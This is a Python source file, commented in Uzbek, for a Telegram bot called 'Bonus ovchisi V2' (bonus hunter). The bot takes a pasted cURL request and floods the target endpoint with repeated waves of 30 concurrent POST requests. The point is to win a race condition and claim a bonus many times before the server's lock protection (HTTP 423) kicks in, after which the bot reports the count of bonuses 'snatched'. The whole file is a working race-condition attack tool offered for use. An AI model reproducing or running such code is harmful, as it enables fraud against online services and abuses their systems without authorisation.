from flask import Flask
import threading
import telebot
from telebot import types
import requests
import time
import os
import re
import json
import concurrent.futures # ASOSIY QUROL: Bir vaqtda o'nlab hujum qilish uchun

BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask('')

@app.route('/')
def home():
    return "Bot yoniq va nazorat ostida!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

users_data = {}
lock = threading.Lock()

def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("🚀 Portlovchi Hujum") # Tugma nomini o'zgartirdik
    btn2 = types.KeyboardButton("🛑 To'xtatish")
    btn3 = types.KeyboardButton("⚙️ Sozlamalarni ko'rish")
    markup.add(btn1, btn2, btn3)
    return markup

def parse_curl(curl_text):
    try:
        url_match = re.search(r"curl\s+'([^']+)'", curl_text)
        url = url_match.group(1) if url_match else None
        headers = {}
        header_matches = re.findall(r"-H\s+'([^:]+):\s*([^']+)'", curl_text)
        for k, v in header_matches:
            headers[k.strip()] = v.strip()
        data = None
        data_match = re.search(r"--data-raw\s+'([^']+)'", curl_text)
        if data_match:
            data = json.loads(data_match.group(1))
        if url and headers:
            return {"url": url, "headers": headers, "data": data, "is_running": False}
    except Exception:
        return None
    return None

def attack(chat_id):
    user = users_data.get(chat_id)
    if not user:
        return
    
    # Tezlikni maksimal qilish uchun Session ishlatamiz (TCP ulanish qayta-qayta ochilmaydi)
    session = requests.Session()
    
    bot.send_message(chat_id, "🌪 Sinxron hujum ishga tushdi! So'rovlar bir millisoniyada yuborilmoqda...")
    
    success_count = 0
    lock_count = 0

    # Bitta oqim bajaradigan mitti vazifa
    def send_req():
        nonlocal success_count, lock_count
        if not user.get("is_running"):
            return
        try:
            resp = session.post(user["url"], headers=user["headers"], json=user["data"], timeout=5)
            if resp.status_code == 200:
                success_count += 1
            elif resp.status_code == 423:
                lock_count += 1
        except:
            pass

    # Asosiy portlatish sikli
    while user.get("is_running"):
        # Bir vaqtning o'zida 30 ta parallel so'rovni serverga uramiz
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            futures = [executor.submit(send_req) for _ in range(30)]
            concurrent.futures.wait(futures) # 30 tasi tugashini kutamiz
            
        # Agar server yopishga ulgurgan bo'lsa (423 xatosi qaytsa)
        if lock_count > 0:
            bot.send_message(chat_id, f"⚠️ Server himoyasi (423) ishga tushdi.\n✅ Ammo undan oldin yulib olingan bonuslar: **{success_count}** ta!\n\nHujum avtomatik to'xtatildi.", parse_mode="Markdown")
            user["is_running"] = False
            break
            
        # Agar yopilmagan bo'lsa, navbatdagi 30 ta to'lqinni yuborishdan oldin 0.2 soniya nafas olamiz
        time.sleep(0.2)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id, 
        "👋 **Bonus ovchisi V2** (Portlash rejimi)!\n\nEndi bot so'rovlarni ketma-ket emas, bir millisoniyada bir nechta yuboradi. cURL yuboring:",
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: message.text.startswith("curl "))
def handle_curl(message):
    parsed = parse_curl(message.text)
    if parsed:
        users_data[message.chat.id] = parsed
        bot.reply_to(message, "✅ cURL qabul qilindi!")
    else:
        bot.reply_to(message, "❌ cURL noto'g'ri.")

@bot.message_handler(func=lambda message: message.text in ["🚀 Portlovchi Hujum", "🛑 To'xtatish", "⚙️ Sozlamalarni ko'rish"])
def handle_menu(message):
    chat_id = message.chat.id
    user = users_data.get(chat_id)

    if message.text == "🚀 Portlovchi Hujum":
        if not user:
            bot.send_message(chat_id, "Oldin `cURL` yuboring!")
            return
        
        with lock:
            if user.get("is_running"):
                bot.send_message(chat_id, "⚠️ Hujum allaqachon ketyapti!")
                return
            user["is_running"] = True
        
        threading.Thread(target=attack, args=(chat_id,), daemon=True).start()

    elif message.text == "🛑 To'xtatish":
        if user and user.get("is_running"):
            user["is_running"] = False
            bot.send_message(chat_id, "🛑 To'xtatish buyrug'i yuborildi. ✅")
        else:
            bot.send_message(chat_id, "Hozir hech qanday hujum ketmayapti.")

    elif message.text == "⚙️ Sozlamalarni ko'rish":
        if user:
            bot.send_message(chat_id, f"📊 Holat: {'Ishlamoqda 🟢' if user['is_running'] else 'To\'xtatilgan 🔴'}")
        else:
            bot.send_message(chat_id, "Ma'lumot yo'q.")

if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception:
            time.sleep(5)
